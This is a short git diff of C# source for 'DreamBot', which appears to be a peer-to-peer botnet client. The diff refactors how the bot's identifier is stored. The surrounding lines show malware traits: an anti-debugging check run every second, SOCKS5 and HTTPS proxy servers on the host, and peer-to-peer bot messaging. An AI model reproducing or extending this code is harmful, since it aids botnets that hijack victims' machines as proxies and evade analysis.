@@ -23,7 +23,6 @@ namespace DreamBot
 {
     public class Bot
     {
-        private static Bot _bot;
         public static void Main(string[] args)
         {
             var idbuf = new byte[16];
@@ -86,6 +85,7 @@ namespace DreamBot
             }
         }
 
+        private static Bot _bot;
         private readonly CommunicationManager _communicationManager;
         private readonly IMessageListener _listener;
         private readonly IWorkScheduler _worker;
@@ -94,13 +94,13 @@ namespace DreamBot
         private readonly MessageManager _messagesManager;
         private readonly Socks5Server _socks5;
         private readonly HttpsProxyServer _https;
-        public static BotIdentifier BotId;
+
         private static readonly Log Logger = new Log(new TraceSource("BOT", SourceLevels.Verbose));
-  
+
         public Bot(int port, BotIdentifier id)
         {
-            BotId = id;
-            Logger.Info("DreamBot [id: {0}] listenning on port {1}", BotId, port);
+            BotIdentifier.Id = id;
+            Logger.Info("DreamBot [id: {0}] listenning on port {1}", BotIdentifier.Id, port);
 
             _worker = ClientWorker.Instance;
             _worker.QueueForever(AntiDebugging.CheckDebugger, TimeSpan.FromSeconds(1));
@@ -113,7 +113,7 @@ namespace DreamBot
             _listener.UdpPacketReceived += EnqueueMessage;
 
             _communicationManager = new CommunicationManager(_listener, _worker);
-            var peersManager = new PeerManager(_communicationManager, _peerList, _worker, BotId);
+            var peersManager = new PeerManager(_communicationManager, _peerList, _worker, BotIdentifier.Id);
             _messagesManager = new MessageManager(peersManager);
 
             // Peer-to-Peer system messages
